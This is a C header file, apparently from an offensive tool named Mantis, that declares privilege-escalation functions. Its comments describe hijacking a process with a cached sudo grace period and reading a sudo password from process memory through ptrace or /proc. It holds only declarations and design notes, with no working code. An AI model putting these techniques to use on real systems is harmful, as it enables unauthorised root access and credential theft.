// techniques.h
// The fun stuff

#ifndef __TECHNIQUES_H
#define __TECHNIQUES_H

// We'll call the first priviledge escalation technique
// "Sudo spoofing." In this technique, we will kill a process imbued
// with "Sudo Grace" (namely, a process that has used Sudo in the last
// ~15 minutes and can use Sudo again to run an admin command but
// doesn't need a password) and replace it with our own process (a
// process with the same PID), giving our new process the "Sudo
// Grace." Once this process exists, we can simply spawn a daemon
// version of itself as root and exit. Once this happens, we can exit,
// too, as our spawn has lived on.
// Additional details:
// When we kill the "graced process," we should send it SIGSEGV
// because this points to the process itself, as opposed to another
// process, which would be the case if we send something like SIGKILL.
// As for the function itself, it won't return on success; it'll kill
// itself on success. Also note, this function will just run... in
// saecula saeculorum. 
// `program`: the program (Mantis) to execute as root.
void sudo_spoof(const char *program);


// As for the second techinque...
// I'm not writing this down right now
// TODO

// This technique also utilizes Sudo, but instead of 'spoofing' the
// process, it will read the password from memory, with, of course, the
// intention of utilizing the password to escalate priviledges. Now,
// there are multiple ways to do this, one utilizing ptrace and another
// workaround method using the `proc/` directory.
// The nature of these functions is the same as `sudo_spoof`, that is,
// that they will run indefinitely and start another process and kill
// itself. It doesn't have to be this way, but I wanted to make the
// interface identical to that of the other function.
// `program`: the program (Mantis) to execute as root.
void stack_logger_ptrace(const char *program);
void stack_logger_wo_ptrace(const char *program);

// Still considering whether I want to try a zero day... Probably not,
// but hey, maybe.

#endif /* __TECHNIQUES_H */

